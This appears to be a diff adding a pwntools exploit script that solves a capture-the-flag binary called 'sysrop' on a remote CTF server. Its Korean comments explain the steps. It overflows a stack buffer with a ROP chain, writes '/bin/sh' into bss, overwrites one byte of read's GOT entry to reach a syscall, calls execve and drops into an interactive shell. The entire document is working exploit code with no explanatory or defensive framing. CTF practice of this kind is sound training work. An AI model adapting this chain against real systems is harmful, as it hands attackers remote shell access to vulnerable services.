@@ -1,0 +1,90 @@
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+
+r = remote("ctf.j0n9hyun.xyz", 3024)
+# r = process("./sysrop")
+
+
+
+libc = ELF("./libc.so.6")
+e = ELF("./sysrop")
+
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+
+
+pop_rax_rdx_rdi_rsi_ret = 0x004005ea
+pop_rdx_rdi_rsi_ret = 0x004005eb
+ret = 0x00400491
+read_plt = 0x4004b0
+read_got = 0x601018
+bss = 0x601040 + 0x900
+
+main = 0x4005F2
+
+# "/bin/sh\x00" bss에 입력
+# read(0, bss, 8)
+payload  = b""
+payload += b"a" * 0x18
+payload += p64(pop_rdx_rdi_rsi_ret) # 3 1 2 순으로 인자 전달 
+payload += p64(len("/bin/sh\x00"))
+payload += p64(0)
+payload += p64(bss)
+payload += p64(read_plt)
+payload += p64(main)
+
+pause()
+r.sendline(payload)
+pause()
+sleep(1)
+r.send("/bin/sh\x00")
+
+
+# read 안의 syscall을 이용
+# 1. read_got -> syscall로 
+payload  = b""
+payload += b"a" * 0x18
+payload += p64(pop_rdx_rdi_rsi_ret)  # 3 1 2 순으로 인자 전달
+payload += p64(1)
+payload += p64(0)
+payload += p64(read_got)
+payload += p64(read_plt)
+
+
+
+# 2. rax = 59 넣어서 execve
+payload += p64(pop_rax_rdx_rdi_rsi_ret) # rax 3 1 2 순으로 인자 전달
+payload += p64(59)
+payload += p64(0)
+payload += p64(bss)
+payload += p64(0)
+payload += p64(read_plt)
+
+pause()
+sleep(1)
+
+r.sendline(payload)
+pause()
+sleep(1)
+r.send(b"\x5e")
+
+
+sleep(1)
+
+
+
+r.interactive()
+
+
+
+
+
+
+
